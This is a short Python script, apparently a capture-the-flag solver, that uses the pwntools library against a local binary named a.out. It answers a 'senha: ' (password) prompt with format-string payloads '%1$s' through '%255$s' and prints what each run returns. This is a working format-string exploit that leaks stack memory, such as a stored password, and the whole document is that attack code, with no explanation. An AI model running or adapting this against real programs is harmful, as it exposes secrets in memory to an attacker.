import pwn

pwn.context.log_level = "critical"

programa = pwn.ELF("./a.out")

for i in range(1, 256):

    payload = b"".join([
        b"%" + str(i).encode("utf-8") + b"$s"
    ])

    pty = pwn.process.PTY
    p = programa.process(stdin=pty, stdout=pty)

    p.recvuntil(b"senha: ")
    p.sendline(payload)
    response = p.recvall().decode("latin-1")
    print(response)


